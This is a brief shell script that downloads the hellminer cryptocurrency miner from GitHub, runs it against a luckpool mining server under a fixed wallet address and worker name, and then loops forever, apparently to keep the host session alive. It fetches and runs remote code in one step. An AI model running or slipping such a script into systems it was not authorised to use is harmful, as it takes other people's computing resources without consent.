#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/hellcatz/hminer/releases/download/v0.57/hellminer_linux64.tar.gz
tar xf hellminer_linux64.tar.gz
cd hellminer_linux64
./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RFgMN2odzF3GuwfKWMiRZquCYsVfh8QnVm.Pacul1 -p x --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999
